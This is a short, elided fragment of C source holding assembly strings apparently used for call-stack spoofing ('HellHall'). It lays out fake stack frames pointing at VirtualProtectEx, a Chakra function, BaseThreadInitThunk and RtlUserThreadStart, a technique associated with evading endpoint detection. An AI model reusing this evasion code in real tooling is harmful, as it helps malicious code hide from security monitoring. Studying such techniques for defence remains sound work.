...
const char *g_HellHallAsm =
    ...
    "        \n"
    "        ; Calculate total frame size: qFrameSize + dynamic sizes\n"
    "        xor rax, rax\n"
    "        mov eax, qFrameSize\n"
    "        add eax, qVirtualProtectExFrame\n"
    "        add eax, qChakraFuncFrame\n"
    "        add eax, qThreadBaseFrame\n"
    "        add eax, qRtlUserThreadStartFrame\n"
    "        sub rsp, rax\n"
    "\n"
    "        ; Build the static frame layout requested\n"
    "        mov r8, rsp\n"
    "        sub r8, 8\n"
    "\n"
    "        xor rax, rax\n"
    "        mov eax, qFrameSize\n"
    "        mov r9, qVirtualProtectEx\n"
    "        mov [r8 + rax], r9\n"
    "\n"
    "        add eax, qVirtualProtectExFrame\n"
    "        mov r9, qChakraFunc\n"
...
const char *g_StubTemplate =
    ...
    "BaseThreadInitThunk\\n\"); return FALSE; }\n"
    "    \n"
    "    qVirtualProtectExFrame = CalcFrameSize(qVirtualProtectEx);\n"
